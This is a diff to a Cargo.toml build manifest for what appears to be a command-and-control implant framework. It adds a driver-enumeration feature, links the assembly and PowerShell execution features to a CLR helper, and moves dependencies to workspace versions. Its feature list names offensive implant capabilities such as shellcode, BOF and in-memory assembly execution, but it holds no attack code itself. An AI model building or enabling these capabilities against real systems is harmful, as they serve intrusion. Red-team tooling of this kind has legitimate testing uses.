@@ -49,8 +49,10 @@ extend = [
 ]
 
 fs_full = [
-    "ls", "cd", "rm", "cp", "mv", "pwd", "mem", "mkdir", "chown", "chmod", "cat", "pipe"
+    "ls", "cd", "rm", "cp", "mv", "pwd", "mem", "mkdir", "chown", "chmod", "cat", "pipe","enum_drivers"
 ]
+
+enum_drivers = []
 
 ls = []
 cd = []
@@ -107,9 +109,9 @@ execute_full = [
 exec = []
 open = []
 execute_shellcode = []
-execute_assembly = []
 execute_bof = []
-execute_powershell = []
+execute_assembly = ["malefic-helper/clr"]
+execute_powershell = ["malefic-helper/clr"]
 execute_armory = []
 execute_exe = []
 execute_dll = []
@@ -125,18 +127,20 @@ download = []
 
 
 [dependencies]
-anyhow = "1.0.81"
-thiserror = "1.0.64"
-futures = "0.3.31"
-futures-timer = "3.0.3"
-obfstr = "0.4.3"
-async-trait = "0.1.83"
-lazy_static = "1.5.0"
+anyhow = { workspace = true }
+thiserror = { workspace = true }
+futures = { workspace = true }
+futures-timer = { workspace = true }
+obfstr = { workspace = true }
+async-trait = { workspace = true }
+lazy_static = { workspace = true }
 malefic-helper = { path= "../malefic-helper" }
 malefic-trait = { path = "../malefic-trait"}
 malefic-proto = { path = "../malefic-proto" }
+tokio = { workspace = true, features = ["time", "rt"] }
+tar = { workspace = true }
 
 
 [build-dependencies]
-prost-build = "0.14.1"
-lazy_static = "1.5.0"
+prost-build = { workspace = true }
+lazy_static = { workspace = true }
